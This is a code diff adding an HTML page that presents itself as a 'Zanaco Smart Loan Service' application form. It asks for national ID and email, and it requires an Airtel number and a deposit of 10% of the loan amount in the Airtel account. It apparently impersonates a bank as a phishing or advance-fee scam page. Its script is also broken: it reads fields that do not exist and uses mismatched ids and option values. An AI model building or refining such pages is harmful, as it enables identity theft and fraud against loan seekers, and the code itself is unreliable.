@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application Form</title>
+<style>
+    body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+    h2 { text-align: center; margin-bottom: 20px; }
+    label { display: block; margin: 10px 0 5px; font-weight: bold; }
+    input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+    button:disabled { background: #ccc; cursor: not-allowed; }
+    .logo-container { width: 100%; height: 120px; overflow: hidden; margin-bottom: 20px; }
+    .logo-container .logo { width: 100%; height: 100%; object-fit: cover; }
+     .loan-notice {
+    background: #fff3cd;
+    color: #856404;
+    border: 1px solid #ffeeba;
+    padding: 12px 15px;
+    border-radius: 6px;
+    margin-bottom: 20px;
+    font-size: 14px;
+    margin-top: 10px;
+}
+
+.loan-notice h4 {
+    margin: 0 0 8px 0;
+    font-size: 15px;
+}
+.zanaco-header {
+    text-align: center;
+}
+</style>
+</head>
+
+<body>
+<div class="loan-container">
+    <h1 class="zanaco-header">Zanaco Smart Loan Service</h1>
+   <div class="logo-container">
+      <img src="zanaco-dp.jpeg" class="logo">
+   </div>
+
+    <h2>Loan Application Form</h2>
+    <form class="loan-details-form">
+        
+         <label for="loanAmount">Loan Amount</label>
+        <input id="loanAmount" type="number" placeholder="Min500-Max20000" required>
+        <label for="email">Email</label>
+        <input id="email" type="email" placeholder="Example@gmail.com" required>
+
+        <label for="nationalId">National ID</label>
+        <input id="nationalId" type="text" placeholder="National ID Number" required>
+
+       
+
+        <label for="repaymentperiod">Repayment Period</label>
+        <select id="repaymentperiod" required>
+            <option value="">-- Select Repayment Period --</option>
+            <option value="employed">7 Days(1.5% Intrest)</option>
+            <option value="self-employed">14 Days(2.5% Intrest)</option>
+            <option value="unemployed">21 Days(3.5% Intrest)</option>
+            <option value="student">30 Days(4.5% Intrest)</option>
+            <option value="student">60 Days(5% Intrest)</option>
+            <option value="student">90 Days(10% Intrest)</option>
+        </select>
+
+        <label for="employmentStatus">Employment Status</label>
+        <select id="employmentStatus" required>
+            <option value="">-- Select Employment Status --</option>
+            <option value="employed">Employed</option>
+            <option value="self-employed">Self-Employed</option>
+            <option value="unemployed">Unemployed</option>
+            <option value="student">Student</option>
+        </select>
+
+        <label for="loanPurpose">Loan Purpose</label>
+        <select id="loanPurpose" required>
+            <option value="">-- Select Loan Purpose --</option>
+            <option value="business">Business</option>
+            <option value="education">Education</option>
+            <option value="medical">Medical</option>
+            <option value="personal">Personal</option>
+            <option value="other">Other</option>
+        </select>
+         <div class="loan-notice">
+    <h4>Loan Qualifications:</h4>
+    <ul>
+        <li>Applicant must use an <strong>Airtel</strong> number.</li>
+        <li>Maintain at least <strong>10%</strong> of the loan amount applying for in the Airtel account.</li>
+    </ul>
+</div>
+
+        <button type="submit" id="nextBtn">Next</button>
+    </form>
+</div>
+
+<script>
+const form = document.querySelector('.loan-details-form');
+const nextBtn = document.getElementById('nextBtn');
+
+form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    // Save all details in localStorage
+    localStorage.setItem('fullName', document.getElementById('fullName').value);
+    localStorage.setItem('phone', document.getElementById('phone').value);
+    localStorage.setItem('email', document.getElementById('email').value);
+    localStorage.setItem('nationalId', document.getElementById('nationalId').value);
+    localStorage.setItem('loanAmount', document.getElementById('loanAmount').value);
+    localStorage.setItem('repaymentPeriod', document.getElementById('repaymentPeriod').value);
+    localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+    localStorage.setItem('loanPurpose', document.getElementById('loanPurpose').value);
+
+    // Redirect to details.html
+    window.location.href = 'details.html';
+});
+</script>
+</body>
+</html>
